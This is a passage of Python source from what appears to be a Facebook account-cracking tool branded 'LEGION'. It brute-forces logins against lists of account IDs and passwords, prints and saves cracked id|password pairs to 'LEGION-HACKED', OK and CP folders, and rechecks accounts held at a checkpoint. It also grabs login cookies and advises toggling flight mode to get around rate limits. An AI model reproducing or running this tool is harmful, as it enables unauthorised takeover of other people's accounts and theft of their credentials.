                        if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r %s[%s\x1b[1;92mLEGION-HACKED%s] %s | %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
                        else:print("\r %s[%s\x1b[1;92mLEGION-HACKED%s] %s | %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                        self.ada.append("%s|%s"%(fl.get("id"),i));_legiondon_hacker_(files_ok,"a+").write("%s|%s\n"%(fl.get("id"),i));break
                else:continue
            self.ko+=1
            print("\r %s[%sCRACK%s][%s%s/%s%s][%sLEGION-\033[1;32mOK\033[1;37m:\033[1;32m%s%s\033[1;37m][%sLEGION-\033[1;31mCP\033[1;37m:\033[1;31m%s%s\x1b[1;97m]%s"%(K,H,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
...
def result():
    clear()
    banner()
    jalan('%s [ %sCRACK RESULTS %s]'%(H,P,H));print('%s '%(O));print('%s [%s1%s] %sCHECK RESULTS OK'%(H,P,H,K));print('%s [%s2%s] %sCHECK RESULTS CP'%(H,P,H,P));ch = _cici_legiondon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    print('\033[1;37m-------------------------------------------------')
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        ...
        try:
            ...
            print('%s '%(O));files = _cici_legiondon_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _legiondon_hacker_("OK/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('|',' | ');print(' %s[%s\x1b[1;92mLEGION-HACKED%s] %s'%(H,P,H,yyy))
        ...
        try:
            cpl = os.listdir("LEGION-CHECKPOINT");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s|%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_legiondon_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _legiondon_hacker_("LEGION-CHECKPOINT/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('|',' | ');print(' %s[%s\x1b[1;91mLEGION-CHECKPOINT%s] %s'%(K,P,K,yyy))
    ...
    print('%s '%(O));_cici_legiondon_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()

def cek_result():
    try:os.remove('option_.txt')
    except:pass
    cik = open('option_.txt','w');cik.write('result');cik.close()
    print('%s [ %sCHECK CRACK RESULT ACCOUNT OPTIONS %s]'%(H,K,H));print('%s '%(O));print('%s [%s•%s] %sEXAMPLE FILE : %s.txt'%(H,P,H,K,tanggal));files__ = _cici_legiondon_('%s [%s•%s] %sFile : '%(H,P,H,K));files = "CP/"+files__
    try:buka_baju = _legiondon_hacker_(files,"r").read().splitlines()
    ...
    for memek in buka_baju:
        ...
        _format_ = "\r %s[%s\x1b[1;91mLEGION-CHECKPOINT%s] %s          "%(K,P,K,kontol)
        try:cek_opsi(titid[0],titid[1],_format_)
        except:continue
    print("");print('%s [%s•%s] %sCHECKING PROCESS COMPLETE'%(H,P,H,K));print('%s '%(O));_cici_legiondon_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
...
def started():
    bersih();clear()
    logo()
    psb('%s [%s•%s] %sON FLIGHT MODE FOR [3 SEC] EVERY 3 MINUTES'%(H,P,H,B))
    print('\033[1;37m-------------------------------------------------')


def folder():
    try:os.mkdir("LEGION-CHECKPOINT")
    except:pass
    try:os.mkdir("LEGION-HACKED")
    except:pass
